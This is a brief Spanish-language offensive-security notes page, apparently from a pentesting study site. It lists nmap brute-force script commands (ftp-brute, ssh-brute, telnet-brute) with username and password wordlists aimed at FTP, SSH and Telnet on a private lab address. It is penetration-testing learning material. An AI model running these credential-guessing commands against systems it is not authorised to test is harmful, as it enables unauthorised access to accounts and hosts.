---
theme: "just-the-docs"
title: "Ataques de Autenticacion/Login"
layout: default
nav_order: 13
parent: "Seguridad Ofensiva"
---
# Ataques de Autenticacion/login
## FTP
### NMAP
```bash
nmap -p 21 --script ftp-brute --script-args userdb=usuarios.txt,passdb=dicc.txt 192.168.85.134
```
## SSH
### NMAP
```bash
nmap -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=dicc.txt 192.168.85.134
```
## TELNET
### NMAP
```bash
nmap -p 23 --script telnet-brute --script-args userdb=usuarios.txt,passdb=dicc.txt 192.168.85.134
```
